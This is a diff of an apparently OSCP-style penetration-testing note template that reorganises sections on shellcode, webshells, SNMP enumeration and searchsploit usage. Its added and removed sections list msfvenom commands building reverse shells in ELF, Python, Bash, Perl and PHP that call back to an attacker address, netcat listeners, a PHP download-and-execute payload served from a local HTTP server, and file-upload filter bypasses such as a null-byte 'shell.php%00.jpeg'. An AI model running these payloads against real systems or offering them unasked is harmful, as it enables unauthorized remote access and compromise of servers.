@@ -1,11 +1,33 @@
 # Info-sheet
 
-- DNS-Domain name:
-- Host name:
-- OS:
-- Kernel:
-- Workgroup:
-- Windows domain:
+### Shellcode
+```
+# Binary
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=4444 -f elf -o shell.elf
+nc -lvnp 4444
+
+# Scripts
+msfvenom -p cmd/unix/reverse_python LHOST=MYIPADDRESS LPORT=4444 -f raw -o shell.py
+msfvenom -p cmd/unix/reverse_bash  LHOST=MYIPADDRESS LPORT=4444 -f raw -o shell.sh
+msfvenom -p cmd/unix/reverse_perl  LHOST=MYIPADDRESS LPORT=4444 -f raw -o shell.pl
+nc -lvnp 4444
+```
+
+### Webshells
+```
+# PHP Download Execute
+msfvenom -p php/download_exec URL=http://MYIPADDRESS/shell.elf -f raw -o shell.php
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=443 -f elf > shell.elf
+python -m SimpleHTTPServer 80
+nc -lvnp 443
+
+# PHP
+msfvenom -p php/reverse_php LHOST=MYIPADDRESS LPORT=80 -f raw -o shell.php
+*use meterpreter multihandler
+
+Use burp when trying to upload files. Try shell.php.jpeg and change the content type, modify the upload name, or use a nullbyte
+shell.php%00.jpeg
+```
 
 ### Full TCP Scan
 INSERTFULLTCPSCAN
@@ -119,10 +141,11 @@ smbclient //INSERTIPADDRESS/ipc$
 ```
 
 ### Port 161/162 UDP - SNMP
-Look for installed programs and other ports that are opened and may have been missed
 INSERTSNMPSCAN
 
 ```
+Look for installed programs and other ports that are opened and may have been missed
+
 nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes INSERTIPADDRESS
 onesixtyone -c /root/Dropbox/Wordlists/wordlist-common-snmp-community-strings.txt INSERTIPADDRESS
 snmp-check INSERTIPADDRESS -c public
@@ -246,8 +269,21 @@ http://open-sez.me/
 https://cirt.net/passwords
 ```
 
-### Manual Checks
+### Find sploits - Searchsploit and google
+Where there are many exploits for a software, use google. It will automatically sort it by popularity.
+```
+site:exploit-db.com apache 2.4.7
 
+# Remove dos-exploits
+
+searchsploit Apache 2.4.7 | grep -v '/dos/'
+searchsploit Apache | grep -v '/dos/' | grep -vi "tomcat"
+
+# Only search the title (exclude the path), add the -t
+searchsploit -t Apache | grep -v '/dos/'
+```
+
+### Manual Checks
 ```
 Step 1:
 View Source/Page for PII
@@ -364,60 +400,6 @@ pass: xampp
 
 ```
 cewl http://INSERTIPADDRESS
-```
-
-### Find sploits - Searchsploit and google
-
-Where there are many exploits for a software, use google. It will automatically sort it by popularity.
-
-```
-site:exploit-db.com apache 2.4.7
-
-# Remove dos-exploits
-
-searchsploit Apache 2.4.7 | grep -v '/dos/'
-searchsploit Apache | grep -v '/dos/' | grep -vi "tomcat"
-
-# Only search the title (exclude the path), add the -t
-searchsploit -t Apache | grep -v '/dos/'
-```
-
-#Shellcode
-```
-# Binary
-msfvenom -p linux/x86/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=4444 -f elf -o shell.elf
-nc -lvnp 4444
-
-# PHP Download Execute
-msfvenom -p php/download_exec URL=http://MYIPADDRESS/shell.elf -f raw -o shell.php
-msfvenom -p linux/x86/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=443 -f elf > shell.elf
-python -m SimpleHTTPServer 80
-nc -lvnp 443
-
-# PHP
-msfvenom -p php/reverse_php LHOST=MYIPADDRESS LPORT=80 -f raw -o shell.php
-*use meterpreter multihandler
-
-# Scripts
-msfvenom -p cmd/unix/reverse_python LHOST=MYIPADDRESS LPORT=4444 -f raw -o shell.py
-msfvenom -p cmd/unix/reverse_bash  LHOST=MYIPADDRESS LPORT=4444 -f raw -o shell.sh
-msfvenom -p cmd/unix/reverse_perl  LHOST=MYIPADDRESS LPORT=4444 -f raw -o shell.pl
-nc -lvnp 4444
-```
-#Webshells
-```
-# PHP Download Execute
-msfvenom -p php/download_exec URL=http://MYIPADDRESS/shell.elf -f raw -o shell.php
-msfvenom -p linux/x86/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=443 -f elf > shell.elf
-python -m SimpleHTTPServer 80
-nc -lvnp 443
-
-# PHP
-msfvenom -p php/reverse_php LHOST=MYIPADDRESS LPORT=80 -f raw -o shell.php
-*use meterpreter multihandler
-
-Use burp when trying to upload files. Try shell.php.jpeg and change the content type, modify the upload name, or use a nullbyte
-shell.php%00.jpeg
 ```
 ----------------------------------------------------------------------------
 
